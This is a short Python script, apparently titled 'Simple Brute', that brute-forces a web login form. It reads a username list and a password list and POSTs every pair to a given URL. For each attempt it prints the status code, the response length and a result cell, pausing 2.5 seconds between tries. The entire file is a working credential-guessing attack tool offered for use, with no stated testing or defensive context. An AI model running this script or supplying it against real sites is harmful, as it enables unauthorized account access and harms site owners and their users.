import sys,requests,time
from bs4 import BeautifulSoup

def prLightPurple(skk): print("\033[94m{}\033[00m" .format(skk))
def prRed(skk): print("\033[91m{}\033[00m" .format(skk))

banner = """
User:{}
Password:{}
Teste:{}
Status-Code:{}
Tamanho:{}
"""

prLightPurple("""                                                         
 @@@@@@   @@@  @@@@@@@@@@   @@@@@@@   @@@       @@@@@@@@  
@@@@@@@   @@@  @@@@@@@@@@@  @@@@@@@@  @@@       @@@@@@@@  
!@@       @@!  @@! @@! @@!  @@!  @@@  @@!       @@!       
!@!       !@!  !@! !@! !@!  !@!  @!@  !@!       !@!       
!!@@!!    !!@  @!! !!@ @!@  @!@@!@!   @!!       @!!!:!    
 !!@!!!   !!!  !@!   ! !@!  !!@!!!    !!!       !!!!!:    
     !:!  !!:  !!:     !!:  !!:       !!:       !!:       
    !:!   :!:  :!:     :!:  :!:        :!:      :!:       
:::: ::    ::  :::     ::    ::        :: ::::   :: ::::  
:: : :    :     :      :     :        : :: : :  : :: ::   
                                                          
                                                          
@@@@@@@   @@@@@@@   @@@  @@@  @@@@@@@  @@@@@@@@           
@@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@@           
@@!  @@@  @@!  @@@  @@!  @@@    @@!    @@!                
!@   @!@  !@!  @!@  !@!  @!@    !@!    !@!                
@!@!@!@   @!@!!@!   @!@  !@!    @!!    @!!!:!             
!!!@!!!!  !!@!@!    !@!  !!!    !!!    !!!!!:             
!!:  !!!  !!: :!!   !!:  !!!    !!:    !!:                
:!:  !:!  :!:  !:!  :!:  !:!    :!:    :!:                
:: ::::  ::   :::  ::::: ::     ::     :: ::::           
:: : ::    :   : :   : :  :      :     : :: ::            
""")


def readFiles(file):
    with open(file, 'r') as nada:
        return nada.readlines()

if len(sys.argv) != 4:    
    prRed("[-] How to use -> python3 http://site.com user.txt password.txt")
else:
    url = sys.argv[1]
    cont = 0
    for i in readFiles(sys.argv[2]):
        for j in readFiles(sys.argv[3]): 
            data = {"login": i, "Password": j, "Submit": "Login"}
            res = requests.post(url, data)
            soup = BeautifulSoup(res.text, 'html.parser')
            try:
                end = soup.findAll('td')[-1]
                print(banner.format(i.replace("\n", ""),j.replace("\n", ""),str(end).split('>')[-3].split('<')[0], res.status_code, len(res.content)))
            except IndexError:
                print(soup.prettify())   
            time.sleep(2.5)
